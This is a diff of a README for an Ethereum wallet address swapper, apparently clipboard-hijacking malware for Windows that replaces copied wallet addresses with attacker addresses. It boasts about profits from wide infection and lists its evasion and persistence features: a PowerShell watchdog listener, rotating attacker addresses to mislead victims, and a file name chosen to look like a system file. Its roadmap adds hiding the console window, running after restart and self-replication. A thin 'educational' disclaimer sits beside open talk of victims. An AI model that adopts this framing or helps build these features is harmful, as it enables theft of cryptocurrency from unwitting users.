@@ -1,9 +1,9 @@
-# :skull_and_crossbones: (ETH) WALLET ADDRESS SWAPPER :skull_and_crossbones:
+# :skull_and_crossbones: ETHEREUM WALLET ADDRESS SWAPPER :skull_and_crossbones:
  
 
 
 
-### DISCLAIMER
+#### DISCLAIMER
 **_THIS WAS CREATED SOLELY FOR EDUCATIONAL PURPOSES AND IS NOT TO BE USED ELSEWHERE. DO NOT USE THIS FOR ILLEGAL PURPOSES, PERIOD! ONLY OPERABLE ON WINDOWS OS!_**
 
 
@@ -17,8 +17,9 @@ this means that other cryptos who desire to possess some level of ETH attributes
 As a direct result of following such standard, progeny cryptos that extends or inherits the ETH protocol/interface
 will have the same wallet address format that prefixes with 0x and is 42 characters long of randomly distributed alphanumeric text.
 This is where this listener exploit becomes advantageous.
+
 (FYI visit https://eidoo.io/erc20-tokens-list to see all ETH based cryptos.
-Viewing this list should open your eyes to the yield potency behind this exploit if it were to live on a number of machines)
+Viewing this list should open your eyes to the yield potency behind this exploit if it were to live on a vast number of machines)
 
 
 
@@ -56,25 +57,23 @@ cd src/main/c#/scripts/powershell
 
 
 ## FEATURES
-    -light memory footprint (7KB file size that uses about 16-19% processor utilization with RAM usage recorded around 3.7MB)
-    -randomization with 10 addresses in order to create the impression that host is being targeted by different bad actors
-    -powershell listener that scans proc list to assure that this script continually runs after its condition is met once.
+    * light memory footprint (7KB file size that uses about 16-19% processor utilization with RAM usage recorded around 3.7MB)
+    * randomization with 10 addresses in order to create the impression that host is being targeted by different bad actors
+    * powershell listener that scans proc list to assure that this script continually runs after its condition is met once.
 	This ensures the script's continuity as the victim will always be under the surveillance of the script's listener.
-    -executable name is social engineered for host to believe this file belongs to the system.
-     	Thus inexperienced victims may be hesitant to delete it due to the potential of their computer being inoperative.
+    * executable name is social engineered for host to believe this file belongs to the system. Thus inexperienced victims may be hesitant to delete it due to the potential of their computer being inoperative.
 
 
 
 
  
 ## ROBUST FEATURES YET TO BE ADDED
-    -remove or silence console window when running
-    -remove logging writes to speed up performance
-    -counter the countermeasure stated above
-    -activation upon computer restart/shutdown
-    -self-replicating file upon deletion
-    -perform thorough performance testing (Is ram/cpu usage intensive or disruptive when host uses other apps?
-					   Does it crash after a certain span of time? If so, why?)
+- [ ] remove or silence console window when running
+- [ ] remove logging writes to speed up performance
+- [ ] counter the countermeasure stated above
+- [ ] activation upon computer restart/shutdown
+- [ ] self-replicating file upon deletion
+- [ ] complete thorough performance testing (Is ram/cpu usage intensive or disruptive when host uses other apps? Does it crash after a certain span of time? If so, why?)
 
 
 
